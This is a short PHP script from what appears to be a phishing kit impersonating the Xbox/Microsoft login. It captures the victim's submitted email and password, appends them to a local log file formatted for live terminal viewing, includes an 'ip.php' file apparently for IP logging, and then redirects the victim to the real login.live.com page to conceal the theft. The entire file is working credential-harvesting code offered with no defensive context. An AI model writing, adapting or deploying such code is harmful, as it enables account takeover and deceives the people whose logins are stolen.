<?php
include 'ip.php';
session_start();

$BRIGHT_GREEN = "\033[1;92m";
$BRIGHT_CYAN = "\033[1;96m";
$BRIGHT_YELLOW = "\033[1;93m";
$RESET = "\033[0m";

$pass = $_POST["passwd"];
$email = $_SESSION["Email"];

file_put_contents("live_login.log", 
    "{$BRIGHT_YELLOW}Xbox {$BRIGHT_CYAN}Username: {$BRIGHT_GREEN}$email {$BRIGHT_CYAN}Pass: {$BRIGHT_GREEN}$pass{$RESET}\n", 
    FILE_APPEND
);

header('Location: https://login.live.com/login.srf');
exit();
session_destroy();
?>